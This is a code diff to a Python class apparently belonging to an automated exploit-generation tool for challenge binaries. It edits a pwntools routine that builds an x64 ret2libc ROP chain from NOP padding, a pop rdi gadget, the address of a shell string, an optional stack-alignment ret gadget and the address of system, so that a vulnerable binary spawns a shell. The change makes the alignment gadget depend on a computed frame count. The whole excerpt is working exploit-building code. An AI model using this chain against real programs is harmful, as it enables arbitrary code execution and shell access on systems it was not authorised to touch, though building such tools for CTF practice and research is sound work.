@@ -265,6 +265,13 @@ class Ret2LibcPutX64(ExploitPrimitive):
         §2.6 baseline does not exercise this path (no Challenge/
         binary hits ret2libc_put-x64), but the contract layer must
         match v3.1 to prevent future binary regressions.
+
+        v4.0.5 (P6.3c fix, B-007 extension): the stack-alignment
+        ``ret`` gadget is no longer hard-coded.  It is included
+        iff ``ctx.frame_context.required_ret_count == 1``
+        (computed by ``recon.frame.compute_required_ret_count``).
+        Defensive default: include ``ret`` when ``frame_context``
+        is ``None`` to preserve v4.0.1 always-align behaviour.
         """
         from pwn import asm, flat, p64
 
@@ -284,19 +291,32 @@ class Ret2LibcPutX64(ExploitPrimitive):
             return b""
 
         g = ctx.gadgets_x64
+        # v4.0.5: principled ret-count from FrameContext (default
+        # True keeps v4.0.1 always-align behaviour when the recon
+        # phase did not populate frame_context — defensive fallback).
+        include_ret = bool(
+            ctx.frame_context.required_ret_count
+            if ctx.frame_context is not None
+            else 1
+        )
+        ret_gadget = p64(g.ret) if include_ret else b""
+
         if g.extra_rdi == 1:
             # v3.1 L2010-2017: extra_rdi=1 → 0 placeholder between sh and ret
+            # to consume the extra ``pop <reg>`` slot.  The 0 here is
+            # **independent** of the alignment ``ret`` — it stays in
+            # both branches.  ``ret_gadget`` is conditionally appended.
             return flat(
                 asm("nop") * ctx.padding
                 + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
-                + p64(g.ret)  # stack-alignment gadget
+                + ret_gadget
                 + p64(system_addr)
             )
         # extra_rdi=0: 4-p64 chain (P6.3 default)
         return flat(
             asm("nop") * ctx.padding
             + p64(g.pop_rdi) + p64(sh_addr)
-            + p64(g.ret)  # stack-alignment gadget
+            + ret_gadget
             + p64(system_addr)
         )
 
